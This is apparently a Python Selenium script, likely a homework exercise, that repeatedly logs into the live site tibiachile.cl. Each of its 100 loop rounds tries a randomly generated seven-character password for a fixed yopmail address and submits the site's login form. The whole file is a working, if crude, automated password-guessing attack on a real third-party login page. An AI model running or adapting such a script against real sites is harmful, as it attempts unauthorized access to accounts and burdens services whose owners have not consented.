from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

email ="TareaCintento0@yopmail.com"
#Password se genera aletoriamente

path = "C:\\Users\\Daniela\\Desktop\\Codigos\\chromedriver.exe"
options =  webdriver.ChromeOptions()
options.add_argument('--start-maximized')
options.add_argument('--disable-extensions')

driver = webdriver.Chrome(path,chrome_options=options )

driver.get("https://tibiachile.cl")

from random import choice

length = 7
values = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<=>@#%&+"


def login(email):
    link = driver.find_element_by_xpath("/html/body/div[2]/div/div/a")
    link.click()
    try: 
        for i in range(100):
            p = ""
            p = p.join([choice(values) for i in range(length)])
            print("pass:",p,i)
            #navegate
            element = WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.LINK_TEXT,"Entrar"))        
            )
            element.click()
            #email
            element = WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.ID,"email"))        
            )
            element.send_keys(email)
            #pass
            element = WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.ID,"passwd"))
            )
            element.send_keys(p)
            #send
            element = WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.XPATH,"/html/body/div/div[1]/div[2]/div[2]/form[2]/fieldset/div/p[4]/input[2]"))        
            )
            element.click()
            #navegate

        
    except:
        driver.quit()

login(email)